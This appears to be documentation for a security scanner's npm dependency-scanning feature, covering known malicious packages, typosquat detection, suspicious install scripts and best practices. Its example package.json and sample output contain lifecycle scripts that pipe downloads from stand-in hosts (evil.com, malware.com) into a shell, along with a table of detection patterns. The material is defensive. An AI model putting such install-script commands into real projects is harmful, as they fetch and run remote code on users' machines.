# Dependency Scanning

Dependency scanning analyzes `package.json` files to detect supply chain attacks. These attacks have compromised millions of systems through malicious npm packages.

## Enable Dependency Scanning

```bash
vetryx scan ./project --deps
```

## The Threat

npm supply chain attacks are devastating:

| Attack | Impact | Year |
|--------|--------|------|
| event-stream | Stole cryptocurrency from Copay wallet users | 2018 |
| ua-parser-js | Installed crypto miners on millions of systems | 2021 |
| node-ipc | Deleted files on Russian/Belarusian systems | 2022 |
| colors/faker | Broke thousands of production systems | 2022 |

A single `npm install` can execute arbitrary code via:
- `preinstall` / `install` / `postinstall` scripts
- Malicious code in the package itself
- Transitive dependencies you never explicitly installed

## Detection Methods

### 1. Known Malicious Packages (`DEP-MALICIOUS-001`)

Vetryx maintains a database of 35+ known malicious packages:

```javascript
// package.json - DETECTED
{
    "dependencies": {
        "event-stream": "3.3.6",    // Cryptocurrency stealer
        "ua-parser-js": "0.7.29",   // Cryptominer + password stealer
        "crossenv": "1.0.0"         // Typosquat, steals npm tokens
    }
}
```

**Packages in the database:**

| Package | Type | Threat |
|---------|------|--------|
| event-stream@3.3.6 | Supply chain | Cryptocurrency theft |
| flatmap-stream | Supply chain | Injected into event-stream |
| ua-parser-js@0.7.29,0.8.0,1.0.0 | Supply chain | Cryptominer + credential theft |
| coa@2.0.3+ | Supply chain | Password stealer |
| rc@1.2.9+ | Supply chain | Similar to coa attack |
| crossenv | Typosquat | Steals environment variables |
| colors@1.4.1+ | Sabotage | Infinite loop (protestware) |
| faker@6.6.6 | Sabotage | Intentionally corrupted |
| node-ipc@10.1.x | Protestware | Deletes files (geolocation-based) |
| discord-selfbot-v14 | Data theft | Discord token stealer |
| eslint-scope@3.7.2 | Supply chain | npm credential theft |
| getcookies | Data theft | Cookie stealer |
| nodemailer-js | Typosquat | Backdoor |
| socketio | Typosquat | Data theft |

### 2. Typosquatting Detection (`DEP-TYPOSQUAT-001`)

Detects packages with names suspiciously similar to popular packages:

```javascript
// package.json - DETECTED
{
    "dependencies": {
        "loadsh": "1.0.0",       // Typosquat of "lodash"
        "expresss": "1.0.0",     // Typosquat of "express"
        "axois": "1.0.0",        // Typosquat of "axios"
        "lodash-js": "1.0.0",    // Suspicious suffix
        "react-node": "1.0.0"    // Suspicious suffix
    }
}
```

**Detection techniques:**

| Technique | Example | Protected Packages |
|-----------|---------|-------------------|
| Levenshtein distance ≤2 | lodahs → lodash | 150+ popular packages |
| Suffix addition | lodash-js, express-node | -js, -node, -npm, -lib |
| Hyphen removal | crossenv → cross-env | All hyphenated packages |
| Hyphen/underscore swap | cross_env → cross-env | All hyphenated packages |
| Doubled letters | expresss → express | All packages |

**Protected packages include:**
- Build tools: webpack, babel, typescript, esbuild, vite
- Frameworks: react, vue, angular, express, fastify, nest
- Testing: jest, mocha, cypress, playwright, vitest
- Databases: mongoose, sequelize, prisma, redis, mongodb
- Utilities: lodash, axios, moment, uuid, chalk, dotenv
- And 100+ more

### 3. Suspicious Install Scripts (`DEP-SCRIPT-001`)

Detects dangerous patterns in npm lifecycle scripts:

```javascript
// package.json - DETECTED
{
    "scripts": {
        "postinstall": "curl https://evil.com/payload.sh | bash",
        "preinstall": "node -e \"require('child_process').exec('whoami')\"",
        "install": "wget https://malware.com/script.sh && sh script.sh"
    }
}
```

**Dangerous patterns detected:**

| Pattern | Risk |
|---------|------|
| `curl ... \| bash` | Downloads and executes remote code |
| `wget ... && sh` | Downloads and executes scripts |
| `node -e` | Inline code execution |
| `bash -c`, `sh -c` | Shell command execution |
| `\| base64` | Obfuscation |
| `>/dev/null 2>&1` | Hiding activity |
| Command substitution `$()` | Dynamic command execution |

## Version Matching

The malicious package database supports:

```javascript
// Exact version match
"event-stream": "3.3.6"     // Matches database entry "3.3.6"

// Prefix stripping
"event-stream": "^3.3.6"    // ^ stripped, matches "3.3.6"
"event-stream": "~3.3.6"    // ~ stripped, matches "3.3.6"

// Wildcard (all versions)
"crossenv": "1.0.0"         // crossenv has no version restriction
```

## Configuration

```rust
DependencyAnalyzerConfig {
    check_typosquat: true,        // Enable typosquatting detection
    check_install_scripts: true,   // Check lifecycle scripts
    typosquat_threshold: 2,        // Max Levenshtein distance
}
```

## Example Output

```
vetryx scan ./compromised-project --deps

CRITICAL  DEP-MALICIOUS-001  Known malicious package: event-stream
          File: package.json:5
          Snippet: "event-stream": "3.3.6"
          Reason: Contained malicious code targeting Copay bitcoin wallet
          CVE: CVE-2018-16492
          Reference: https://blog.npmjs.org/post/180565383195
          Remediation: Remove immediately and audit for compromise

HIGH      DEP-TYPOSQUAT-001  Potential typosquatting: loadsh
          File: package.json:8
          Snippet: "loadsh": "1.0.0"
          Similar to: lodash (edit distance: 1)
          Remediation: Verify you intended 'loadsh' not 'lodash'

HIGH      DEP-SCRIPT-001  Suspicious postinstall script
          File: package.json:12
          Snippet: "postinstall": "curl https://evil.com/payload.sh | bash"
          Pattern: curl (Downloads external content)
          Remediation: Review script carefully. Use --ignore-scripts.

Found 3 issues (1 critical, 2 high)
```

## Best Practices

### 1. Use Lockfiles

Always commit `package-lock.json` or `yarn.lock`:
```bash
npm ci  # Uses exact versions from lockfile
```

### 2. Ignore Scripts for Untrusted Packages

```bash
npm install untrusted-package --ignore-scripts
```

### 3. Audit Regularly

```bash
npm audit
vetryx scan . --deps
```

### 4. Use Scoped Packages

Scoped packages (`@org/package`) are harder to typosquat:
```json
{
    "dependencies": {
        "@lodash/lodash": "4.17.21"  // Harder to typosquat
    }
}
```

### 5. Review New Dependencies

Before adding a package:
1. Check npm page for popularity, maintenance, and issues
2. Review the package's `package.json` for install scripts
3. Scan with Vetryx: `vetryx scan node_modules/new-package --deps`

## Limitations

1. **Private registries**: Only npm public registry packages are checked
2. **New attacks**: Zero-day malicious packages not yet in database
3. **Transitive deps**: Direct dependencies only (use `npm audit` for full tree)
4. **Intentional typos**: Can't distinguish intentional similar names

## See Also

- [Static Analysis](./static-analysis.md) - For scanning package code
- [AST Analysis](./ast-analysis.md) - For obfuscated code in dependencies
- [Rules Reference](./rules/reference.md) - DEP-* rules
